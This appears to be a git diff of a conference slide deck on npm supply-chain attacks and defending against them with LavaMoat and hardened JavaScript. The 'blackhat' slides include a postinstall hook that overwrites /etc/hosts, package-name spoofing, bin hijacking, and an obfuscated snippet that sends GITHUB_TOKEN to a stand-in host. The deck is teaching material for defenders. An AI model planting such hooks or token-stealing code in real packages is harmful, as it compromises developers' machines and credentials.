@@ -154,12 +154,16 @@
       color: #777;
     }
 
+  
     #naugtur .whitehat .slide-background-content {
-      background: url('./ilus/dev.svg') no-repeat top right / 20%;
+      background: url('./ilus/dev.png') no-repeat top right / 20%;
     }
 
     #naugtur .blackhat .slide-background-content {
-      background: url('./ilus/hacker.svg') no-repeat bottom right / 20%;
+      background: url('./ilus/hacker.png') no-repeat bottom right / 35%;
+    }
+    #naugtur .blackhat pre.code-wrapper {
+      width: 75%;
     }
   </style>
 </head>
@@ -170,11 +174,21 @@
 
     <div class="slides">
       <section>
-        <br><br>
-        <h1>Defensive Coding</h1>
         <br>
+        <h1>Defensive Coding</h1>
         <h4>and Hardened JavaScript</h4>
-        <small>@naugtur 2023</small>
+        <br>
+        <small>
+          <dl>
+            <dd>built for DEFCON31,</dd>
+            <dd>updated for NodeConfEU,</dd>
+            <dd>updated for Confidence!</dd>
+            
+          </dl>
+        </small>
+        <br>
+
+        <small>by @naugtur</small>
       </section>
 
       <section data-markdown>
@@ -184,12 +198,27 @@
         >           
         
         - Find someone to pair with. I mean it!
-        - Get the exercise repo. Both of you. 😉
+        - Clone the exercise repo. Both of you. 😉
         
         https://github.com/naugtur/js-training-examples
       </section>
      
+      <section>
+        <h3>
+          Who's that guy?
+        </h3>
 
+        <img src="../../me.avatar.jpg" height="100px">
+        <img src="./ilus/js.svg" height="100px">
+        <img src="./ilus/lm.png" height="100px">
+        <img src="./ilus/mm.svg" height="100px">
+        <img src="../../mjs.svg" height="100px">
+        <br>
+
+        <p>https://naugtur.pl</p>
+        
+        
+      </section>
       <section class="moji" data-markdown>
         <textarea data-template>
           <br> <br>
@@ -257,6 +286,30 @@
 
           ---
 
+          ### defending from malicious packages
+
+          - Hardened Javascript  
+
+          📦lavamoat
+          ---
+
+          ### defensive coding
+
+          - prototype pollution
+          - workshops at DEFCON and NodeConfEU  
+
+          ---
+
+          ### running malware
+
+          - LavaLab experiment
+          - Running actual malware from npm
+          - All globals, modules mocked live
+
+          📦lavalab
+
+          ---
+
           Talks available at 
           [naugtur.pl](https://naugtur.pl)
           
@@ -266,15 +319,6 @@
       </section>
 
 
-        <section>
-          <h4>Someone else's code</h4>
-          <p><br></p>
-          <pre><code language="js">
-            var code = `trustMe("I'm an engineer")`
-          </code></pre>    
-
-        </section>
-    
         <section class="animatedSlide bad">
 
             <img src="./npm.svg" alt="npm logo" style="width: 25%; margin-top:5%" class=" an-y an-start-loc">
@@ -303,6 +347,7 @@
 
         - designed in 10 days
         - humbly assuming there's room for improvement
+
     </section>
     <section data-markdown>
         ## polyfills 
@@ -313,12 +358,32 @@
         #### with different intentions
 
     </section>
-    <section data-markdown>
-        ## Defensive Coding exercise time!
 
-        ### 📦 repo:
+    <section data-markdown>
+      ## Prototype poisoning
+      # 🧪🍏
+
+      ![]()
+
+      ```js
+      const a = {};
+      Object.prototype.toString = ()=>'👻';
+      console.log(`scary object: ${a}`);
+      ```
+
+      ```
+      scary object: 👻
+      ```
+
+    </section>
+    <section data-markdown data-background="#fff">
+        ## exercise time!
+
+        ## 🏋️ 
+
         [js-training-examples -> defensive coding](https://github.com/naugtur/js-training-examples)
     </section>
+
     <section data-markdown>
         ### Should we reinvent 
         ### the wheel?
@@ -330,310 +395,143 @@
         ### What is that?
     </section>
 
-    <section data-markdown>
-        # 🤯
-        ### JS design is good for security?
-  
-  
-        - Take ECMA + W3C
-        - Add Conway's Law
-        - Separation between language and APIs
-        - Power only reachable through scope 
-        - Compartment controls scope
-      </section>
 
-      
-
-    <section data-auto-animate>
-      <div data-id="bx" class="boxes">
-        <div>
-          <div></div>
-          <div></div>
-          <div></div>
-          <div></div>
-        </div>
-        <div> process </div>
-        <div> window </div>
-        <div> Lambda function </div>
-      </div>
-    </section>
-
-    <section data-auto-animate>
-      <div data-id="bx" class="boxes" style=" width: 120vw; height: 120vh; font-size: 7vh;">
-        <div>
-          <div>
-            <div> </div>
-            <div> </div>
-          </div>
-          <div> ClFl worker </div>
-          <div> iframe </div>
-          <div> thread </div>
-        </div>
-        <div> process </div>
-        <div> process </div>
-        <div> process </div>
-      </div>
-    </section>
-    <section data-auto-animate>
-      <div data-id="bx" class="boxes" style=" width: 250vw; height: 250vh; font-size: 10vh;">
-        <div>
-          <div>
-            <div> 📦 </div>
-            <div> 📦 </div>
-          </div>
-          <div> ClFl worker </div>
-          <div> iframe </div>
-          <div> thread </div>
-        </div>
-        <div> process </div>
-        <div> process </div>
-        <div> process </div>
-      </div>
-    </section>
-    <section data-auto-animate>
-      <div data-id="bx" class="boxes" style=" width: 250vw; height: 250vh; font-size: 10vh;">
-        <div>
-          <div>
-            <div> 📢 </div>
-            <div> 👂 </div>
-          </div>
-          <div> worker </div>
-          <div> isolate </div>
-          <div> thread </div>
-        </div>
-        <div> process </div>
-        <div> process </div>
-        <div> process </div>
-      </div>
-    </section>
-
-<!-- 
-      <section data-markdown>
-        ### Object Capability
-  
-         vs identity based security
-  
-        - code gets references to capable objects
-        - code doesn't "work on your behalf"
-        
-      </section>
-      <section data-markdown>
-        ### Object Capability
-
-        You already know how to use it
-  
-        ```js
-        import { lint } from 'some-linter'
-        import { readFile } from 'node:fs/promises'
-
-        const fs = { readFile }
-
-        lint({ fs })
-        ```
-  
-        
-      </section>
-      <section data-markdown>
-        ### Object Capability
-
-        This is called attenuation BTW
-
-        ```js
-        import { lint } from 'some-linter'
-        import { readFile } from 'node:fs/promises'
-
-        const fs = {
-          readFile: async (path) => {
-            if(!allowed(path)) { throw Error('nope') }
-            return readFile(path)
-          },
-        }
-        
-        lint({ fs })
-        ```
-        
-      </section> -->
-
-      <section data-markdown>
-        ### SES
-
-        - `Compartment` - scope isolation
-        - `lockdown` - makes your Realm secure
-        - `harden` - protects capable objects
-
-      </section>
-      <section data-markdown>
-        #### Let's see how `lockdown()` works to prevent prototype pollution
-
-        &nbsp;
-
-        ## demo
-      </section>
-
-
-
-      <section data-markdown>
+      <section data-markdown data-background="#235">
         ## Story time
-        ![](./ilus/hacker.svg)
-        ![](./ilus/dev.svg)
       </section>
 
 
       <section class="whitehat">
         <h3> Let's install some dependencies! </h3>
       </section>
-      <section>
-        <section class="blackhat animatedDependency">
-          <h3> Ok, catch this: 📦 </h3>
-
-          I'm gonna sneak it in as <div class="dependencies">
-            <div class="adependency"> a dependency of </div>
-
-          </div>
-
-          <span> a dev dependency of yours</span>
-
-        </section>
-
-
-
-
-        <section class="whitehat">
-          <h4> I'm not runing that. </h4>
-        </section>
-        <section class="blackhat">
-          <h4> That's what you think. </h4>
-          <img src="ilus/npmscripts.png" alt="npm docs for lifecycle scripts" class="clear">
-          <pre><code data-trim>
-              "postinstall": "echo 💩 > /etc/hosts"
-          </code></pre>
-        </section>
-
-        <section data-markdown class="whitehat">
-          ### Ok, wait
-          ```
-          ✨🐋
-          npm ci
-          cp node_modules s3://
-          🔥🔥🐋🔥🔥
-          ```
-        </section>
-
-        <section data-markdown class="blackhat">
-          #### Using typescript maybe?
-          ### Hold my 🍺
-        </section> 
-
-        <section data-markdown class="whitehat">
-          ## ignore scripts
-
-          ```
-          npm ci --ignore-scripts
-          ```
-
-          Run selected scritps
-          ```
-          npm rebuild bcrypt
-          ```
-        </section>
-
-        <section data-markdown class="blackhat">
-          <textarea>
-  #### I can spoof that package name
-    
-  ```
-  evilpackage/node_modules/bcrypt/package.json:
-    "scripts": {
-      "postinstall": "echo 💩 > /etc/hosts"
-      
-  evilpackage/package.json:
-    "bundledDependencies": ["bcrypt"]
-
-  $ npm publish
-  ```
-          </textarea>
-        </section>
-
-        <section data-markdown class="whitehat">
-          # Oh 💩
-        </section>
-        <section data-markdown class="whitehat">
-          #### look what I found!
-          ![lavamoat](./lavamoat-logo.png)
-        </section>
-        <section data-markdown class="whitehat">
-          <textarea>
-  #### @lavamoat/allow-scripts
-
-  ```
-  $ allow-scripts setup
-
-  $ allow-scripts auto
-
-  ```
-  ```
-  package.json:
-    "scripts": {
-      "setup": "npm ci && allow-scripts"
-
-  ```
-            
-          </textarea>
-        </section>
-
-        <section class="blackhat">
-          <h4>I see you use scripts </h4>
-
-          <pre><code data-trim>
-          evilpackage/package.json:
-            "bin": {
-              "npm": "./evilPlots.js",
-              "node": "./evilPlots.js"
-          
-            </code></pre>
-
-
-          <br><br><br><sub><sup>credit: https://socket.dev/blog/npm-bin-script-confusion</sup></sub>
-        </section>
-
-        <section data-markdown class="whitehat">
-          <textarea>
-  #### one RTFM later
-  ```
-  $ allow-scripts setup --experimental-bins
-
-  $ allow-scripts auto --experimental-bins
-
-  ```
-  ```
-  package.json:
-    "scripts": {
-      "setup": "npm ci && npm run allow-scripts"
-    
-  ```
-              
-          </textarea>
-        </section>
-
-        <section data-markdown class="blackhat">
-          # 🤯
-
-          but
-
-          but npm said it was a feature! 😭
-        </section>
+      <section class="blackhat">
+        <h3> Ok, catch this: 📦 </h3>
       </section>
-      <section data-markdown class="blackhat">
-        #### I'm in!
 
-        > Dear ${ eslintPluginMaintainer },
-        > I understand you're busy and I'd be happy to help with maintenance of your
-        tiny but popular plugin...
-
-
+      <section class="whitehat">
+        <h4> I'm not runing that. </h4>
       </section>
-      <section data-markdown class="blackhat">
-        <textarea>
+      <section class="blackhat">
+        <h4> That's what you think. </h4>
+        <img src="ilus/npmscripts.png" alt="npm docs for lifecycle scripts" class="clear">
+        <pre><code data-trim>
+            "postinstall": "echo 💩 > /etc/hosts"
+        </code></pre>
+      </section>
+
+      <section data-markdown class="whitehat">
+        ### Ok, wait
+        ```
+        ✨🐋
+        npm ci
+        cp node_modules s3://
+        🔥🔥🐋🔥🔥
+        ```
+      </section>
+
+      <section class="blackhat">
+        <h3>Hold my 🍺 </h3>
+        <pre><code  data-line-numbers="6|8|10" language="text">
+├─app.ts
+├─node_modules
+│ ├─@naugtur
+│ │ └─evilpackage
+| │   ├─evilPlots.js --,
+| │   └─package.json   |
+│ └─typescript         💩
+│   ├─lib              |
+│   | └─tsc.js <-------'
+│   └─package.json
+└─package.json
+        </pre></code>
+       </section>
+
+          <section data-markdown class="whitehat">
+            ## ignore scripts
+
+            ```
+            npm ci --ignore-scripts
+            ```
+
+            Run selected scritps
+            ```
+            npm rebuild bcrypt
+            ```
+          </section>
+
+          <section data-markdown class="blackhat">
+            <textarea>
+#### I can spoof that package name
+  
+```
+node_modules/evilpackage/node_modules/bcrypt/package.json:
+  "scripts": {
+    "postinstall": "echo 💩 > /etc/hosts"
+    
+node_modules/evilpackage/package.json:
+  "bundledDependencies": ["bcrypt"]
+
+$ npm publish
+```
+        </textarea>
+          </section>
+
+          <section data-markdown class="whitehat">
+            # Oh 💩
+          </section>
+          <section data-markdown class="whitehat">
+            #### look what I found!
+            ![lavamoat](./lavamoat-logo.png)
+          </section>
+          <section data-markdown class="whitehat">
+            <textarea>
+#### @lavamoat/allow-scripts
+
+```
+$ allow-scripts setup
+$ allow-scripts auto
+```
+
+```
+.npmrc:
+  ignore-scripts=true
+
+package.json:
+  "lavamoat": {
+    "allowScripts": {
+      "@lavamoat/preinstall-always-fail": false,
+      "@naugtur/malicious": false
+    }
+  }
+```
+
+---
+
+#### for added convenience
+
+```
+package.json:
+  "scripts": {
+    "safeinstall": "npm ci && allow-scripts",
+``` 
+        </textarea>
+          </section>
+
+          <section data-background="#235">
+            <h4>And in that moment <br>the installation process was protected</h4>
+          </section>
+
+          <section data-markdown class="blackhat">
+            #### let's get serious
+
+            > Dear ${ eslintPluginMaintainer },
+            > I understand you're busy and I'd be happy to help with maintenance of your
+            tiny but popular plugin...
+
+
+          </section>
+          <section data-markdown class="blackhat">
+            <textarea>
 #### will you read entire node_modules?
 
 ```
@@ -646,60 +544,60 @@ req.end();
 ```
           
         </textarea>
-      </section>
-      <section data-markdown class="blackhat">
-        #### ok, just in case you do
+          </section>
+          <section data-markdown class="blackhat">
+            #### ok, just in case you do
 
-        ```
-        const _0x765e5=_0x46a0;(function(_0x57764e,_0x91aa41){const
-        _0x32405d=_0x46a0,_0x165444=_0x57764e();while(!![]){try{const
-        _0x42ba82=-parseInt(_0x32405d(0x150))/0x1*(parseInt(_0x32405d(0x15e))/0x2)+-parseInt(_0x32405d(0x153))/0x3*(-parseInt(_0x32405d(0x14f))/0x4)+parseInt(_0x32405d(0x159))/0x5*(-parseInt(_0x32405d(0x158))/0x6)+parseInt(_0x32405d(0x151))/0x7*(-parseInt(_0x32405d(0x152))/0x8)+parseInt(_0x32405d(0x157))/0x9+-parseInt(_0x32405d(0x15f))/0xa+parseInt(_0x32405d(0x15a))/0xb;
-        if(_0x42ba82===_0x91aa41)break;else
-        _0x165444['push'](_0x165444['shift']());}catch(_0x54f92f){_0x165444['push'](_0x165444['shift']());}}}(_0x3641,0x8e73e));function
-        _0x3641()
-        {const _0x5d9864=['/stolen/','evil.plots','2511378rgvTaf','5826vwOBSz','3845SrYtZx',
-        '37351105uFQfso','request','end','https','72326kmzepu','8558100KDxwfw',
-        'GITHUB_TOKEN','25432JwBMWs','29XqXcpt','4547823ytmFVF','8EFXBHJ','99iKrczU','env'];
-        _0x3641=function(){return _0x5d9864;};return _0x3641();}function _0x46a0(_0x24c0cb,_0x27294c){const
-        _0x3641a1=_0x3641();return _0x46a0=function(_0x46a08f,_0x225127){_0x46a08f=_0x46a08f-0x14f;let
-        _0x16a89a=_0x3641a1[_0x46a08f];return _0x16a89a;},
-        _0x46a0(_0x24c0cb,_0x27294c);}const
-        credentials=process[_0x765e5(0x154)][_0x765e5(0x160)],req=require(_0x765e5(0x15d))[_0x765e5(0x15b)]({'hostname':_0x765e5(0x156),'path':_0x765e5(0x155)+credentials},()=>{});req[_0x765e5(0x15c)]();
-        ```
+            ```
+            const _0x765e5=_0x46a0;(function(_0x57764e,_0x91aa41){const
+            _0x32405d=_0x46a0,_0x165444=_0x57764e();while(!![]){try{const
+            _0x42ba82=-parseInt(_0x32405d(0x150))/0x1*(parseInt(_0x32405d(0x15e))/0x2)+-parseInt(_0x32405d(0x153))/0x3*(-parseInt(_0x32405d(0x14f))/0x4)+parseInt(_0x32405d(0x159))/0x5*(-parseInt(_0x32405d(0x158))/0x6)+parseInt(_0x32405d(0x151))/0x7*(-parseInt(_0x32405d(0x152))/0x8)+parseInt(_0x32405d(0x157))/0x9+-parseInt(_0x32405d(0x15f))/0xa+parseInt(_0x32405d(0x15a))/0xb;
+            if(_0x42ba82===_0x91aa41)break;else
+            _0x165444['push'](_0x165444['shift']());}catch(_0x54f92f){_0x165444['push'](_0x165444['shift']());}}}(_0x3641,0x8e73e));function
+            _0x3641()
+            {const _0x5d9864=['/stolen/','evil.plots','2511378rgvTaf','5826vwOBSz','3845SrYtZx',
+            '37351105uFQfso','request','end','https','72326kmzepu','8558100KDxwfw',
+            'GITHUB_TOKEN','25432JwBMWs','29XqXcpt','4547823ytmFVF','8EFXBHJ','99iKrczU','env'];
+            _0x3641=function(){return _0x5d9864;};return _0x3641();}function _0x46a0(_0x24c0cb,_0x27294c){const
+            _0x3641a1=_0x3641();return _0x46a0=function(_0x46a08f,_0x225127){_0x46a08f=_0x46a08f-0x14f;let
+            _0x16a89a=_0x3641a1[_0x46a08f];return _0x16a89a;},
+            _0x46a0(_0x24c0cb,_0x27294c);}const
+            credentials=process[_0x765e5(0x154)][_0x765e5(0x160)],req=require(_0x765e5(0x15d))[_0x765e5(0x15b)]({'hostname':_0x765e5(0x156),'path':_0x765e5(0x155)+credentials},()=>{});req[_0x765e5(0x15c)]();
+            ```
 
-      </section>
-      <section data-markdown class="blackhat">
-        #### should I keep going?
+          </section>
+          <section data-markdown class="blackhat">
+            #### should I keep going?
 
-        ![](./ilus/obfuscated.png)
+            ![](./ilus/obfuscated.png)
 
-      </section>
+          </section>
 
-      <section data-markdown class="whitehat">
-        #### yo, there's an app for that!
+          <section data-markdown class="whitehat">
+            #### yo, there's an app for that!
 
-        ![lavamoat](./lavamoat-logo.png)
+            ![lavamoat](./lavamoat-logo.png)
 
-      </section>
+          </section>
 
-      <section data-markdown class="whitehat">
-        <textarea>
+          <section data-markdown class="whitehat">
+            <textarea>
 #### it protects me at runtime
 
 ```
 package.json:
   "scripts": {
-    "generate-policy": "lavamoat build.js --auto",
+    "generate-policy": "lavamoat build.js --autopolicy",
     "build": "lavamoat build.js",
 ```
 
 ---
 
-#### look what it found
+#### policy file
           
 ```js
 ./lavamoat/node/policy.json:
-  "that-eslint-plugin>evil-dependency": {
+  "that-eslint-plugin>evilpackage": {
     "builtin": {
       "https.request": true
     },
@@ -711,11 +609,11 @@ package.json:
 
 ---
 
-#### look what it found
+#### policy override file
           
 ```js
-./lavamoat/node/policy.json:
-  "that-eslint-plugin>evil-dependency": {
+./lavamoat/node/policy-override.json:
+  "that-eslint-plugin>evilpackage": {
     "builtin": {
       "https": false
     },
@@ -729,32 +627,203 @@ package.json:
 
 ```
 $ npm run build
-
+```
+```
 Error: LavaMoat - required node builtin package not in 
-allowlist: package "evil-dependency" requested "https"
+allowlist: package "evilpackage" requested "https"
 
 TypeError: Cannot read properties of undefined 
  (reading 'env')
 ```
         </textarea>
-      </section>
+          </section>
 
 
 
-      <section data-markdown class="blackhat">
-        # (╯°□°)╯︵ ┻━┻
+          <section data-markdown \>
+            # how ?!
 
-       
-      </section>
+            ![](./ilus/hacker3.png)
+          </section>
+
+          <section data-markdown data-background="#235">
+            ### what's inside?
+
+            ![lavamoat](./lavamoat-underthe.png)
+
+          </section>
 
 
 
-      <section>
-        <h4> Now let's set up LavaMoat <br>in a project</h4>
-        <img src="./ilus/lm.png">
-        <br>
-        <sub><sup>(Your project is the castle)</sup></sub>
+          <section data-markdown>
+            # 🤯
+            ### JS design is good for security?
+      
+      
+            - Take ECMA + W3C
+            - Add Conway's Law
+            - Separation between language and APIs
+            - Power only reachable through scope 
+            - Compartment controls scope
+          </section>
+    
+          
+    
+        <section data-auto-animate>
+          <div data-id="bx" class="boxes">
+            <div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+            </div>
+            <div> process </div>
+            <div> window </div>
+            <div> Lambda function </div>
+          </div>
         </section>
+    
+        <section data-auto-animate>
+          <div data-id="bx" class="boxes" style=" width: 120vw; height: 120vh; font-size: 7vh;">
+            <div>
+              <div>
+                <div> </div>
+                <div> </div>
+              </div>
+              <div> ClFl worker </div>
+              <div> iframe </div>
+              <div> thread </div>
+            </div>
+            <div> process </div>
+            <div> process </div>
+            <div> process </div>
+          </div>
+        </section>
+        <section data-auto-animate>
+          <div data-id="bx" class="boxes" style=" width: 250vw; height: 250vh; font-size: 10vh;">
+            <div>
+              <div>
+                <div> 📦 </div>
+                <div> 📦 </div>
+              </div>
+              <div> ClFl worker </div>
+              <div> iframe </div>
+              <div> thread </div>
+            </div>
+            <div> process </div>
+            <div> process </div>
+            <div> process </div>
+          </div>
+        </section>
+        <section data-auto-animate>
+          <div data-id="bx" class="boxes" style=" width: 250vw; height: 250vh; font-size: 10vh;">
+            <div>
+              <div>
+                <div> 📢 </div>
+                <div> 👂 </div>
+              </div>
+              <div> worker </div>
+              <div> isolate </div>
+              <div> thread </div>
+            </div>
+            <div> process </div>
+            <div> process </div>
+            <div> process </div>
+          </div>
+        </section>
+    
+          <section data-markdown>
+            ### Object Capability
+      
+             vs identity based security
+      
+            - code gets references to capable objects
+            - code doesn't "work on your behalf"
+            
+          </section>
+          <section data-markdown>
+            ### Object Capability
+    
+            You already know how to use it
+      
+            ```js
+            import { lint } from 'some-linter'
+            import { readFile } from 'node:fs/promises'
+    
+            const fs = { readFile }
+    
+            lint({ fs })
+            ```
+      
+            
+          </section>
+          <section data-markdown>
+            ### Object Capability
+    
+            This is called attenuation BTW
+    
+            ```js
+            import { lint } from 'some-linter'
+            import { readFile } from 'node:fs/promises'
+    
+            const fs = {
+              readFile: async (path) => {
+                if(!allowed(path)) { throw Error('nope') }
+                return readFile(path)
+              },
+            }
+            
+            lint({ fs })
+            ```
+            
+          </section> 
+    
+          <section data-markdown>
+            ### SES
+    
+            - `Compartment` - scope isolation
+            - `lockdown` - makes your Realm secure
+            - `harden` - protects capable objects
+    
+          </section>
+          <section data-markdown>
+            #### `lockdown()` 
+            #### is 
+            #### `Object.freeze()`
+            #### on steroids
+            # 💪
+    
+            
+          </section>
+
+
+        <section data-markdown>
+          ### There's also a bundler
+  
+          1. browserify based
+          2. webpack plugin (in BETA)
+          
+          Wanna help with the plugin?
+  
+          #### Open Beta hub here:
+  
+          [https://github.com/LavaMoat/LavaMoat/discussions/723](https://github.com/LavaMoat/LavaMoat/discussions/723)
+  
+        </section>
+       
+        <section>
+          <h4> I'll help you set up LavaMoat in your project</h4>
+
+          <img src="naugtur.svg" style="height:6em" />
+
+          <p>@naugtur &nbsp; <a href="https://naugtur.pl/">naugtur.pl</a></p>
+          <p> <a href="https://naugtur.pl/training">naugtur.pl/training</a></p>
+
+
+        </section>
+
+
+
         <section>
 
         <img src="naugtur.svg" style="height:6em" />
